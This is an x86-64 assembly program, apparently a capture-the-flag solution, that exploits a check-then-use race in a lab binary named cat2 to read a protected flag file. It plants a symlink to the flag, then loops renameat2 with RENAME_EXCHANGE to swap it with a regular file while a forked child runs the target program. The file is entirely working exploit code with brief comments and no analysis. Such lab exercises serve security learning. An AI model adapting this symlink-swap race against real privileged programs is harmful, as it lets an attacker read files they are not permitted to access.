.globl _start
.intel_syntax noprefix
_start:
	// this a race condition, need to run multiple times
	// works one out of five times at the very least(for me)
	// rm('file')
	lea rdi, [rip+file]
	mov rax, 87
	syscall

	// rm('fake_flag')
	lea rdi, [rip+fake_flag]
	mov rax, 87
	syscall

	// open('file', O_RDWR|O_CREAT, 0o777)
	lea rdi, [rip+file]
	mov rsi, 0x42
	mov rdx, 511
	mov rax, 2
	syscall

	// ln -s /flag flag
	lea rdi, [rip+flag]
	lea rsi, [rip+fake_flag]
	mov rax, 88
	syscall

	// fork
	mov rax, 57
	syscall

	cmp rax, 0
	je child

parent:
	// renameat2(AT_FWD, "fake_flag", AT_FWD, "file", RENAME_EXCHANGE)
	mov rdi, -100
	lea rsi, [rip+fake_flag]
	mov rdx, -100
	lea r10, [rip+file]
	mov r8, 2
	mov rax, 316
	syscall
	jmp parent
	
child:
	// execve('cat2', ['cat2','file'])
	lea rdi, [rip+program]
	
	lea rax, [rip+program]
	mov [rsp+0x30], rax

	lea rax, [rip+file]
	mov [rsp+0x38], rax
	
	xor eax, eax
	mov [rsp+0x40], rax

	mov rsi, rsp
	add rsi, 0x30
	mov rdx, 0
	mov rax, 59
	syscall

program:
.string "/home/run/cat2"

file:
.string "file"

flag:
.string "/home/run/flag"

fake_flag:
.string "flag"
